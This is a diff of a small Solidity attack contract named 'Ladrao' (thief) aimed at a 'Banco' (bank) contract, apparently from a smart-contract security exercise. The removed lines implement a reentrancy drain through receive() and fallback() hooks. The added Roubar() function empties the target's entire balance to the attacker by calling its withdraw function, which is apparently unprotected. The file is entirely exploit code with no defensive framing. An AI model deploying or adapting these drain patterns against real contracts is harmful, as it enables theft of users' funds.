@@ -2,32 +2,35 @@
 pragma solidity ^0.8.2;
 
 interface Banco {
-    function Sacar() external payable;
+    function Sacar(address _to,uint256 _amount) external;
+    function Depositar() external payable ;
 }
 
 contract Ladrao {
-    address public owner;
+    address  payable public owner;
 
     Banco banco;
 
     constructor(address _endereco_alvo) {
         banco = Banco(_endereco_alvo);
-        owner = msg.sender;
+        owner = payable(msg.sender);
+    }   
+    function Depositar() public payable{
+        return banco.Depositar();
     }
 
-    function Sacar() public payable {
-        return banco.Sacar();
+
+    function Roubar() public   {
+            if(address(banco).balance>0){
+                banco.Sacar(owner,address(banco).balance);
+
+            }
+            
+
+            
     }
 
-    function Roubar() public {
-        Sacar();
-    }
 
-    receive() external payable {
-        Roubar();
-    }
 
-    fallback() external payable {
-        Roubar();
-    }
-}
+
+
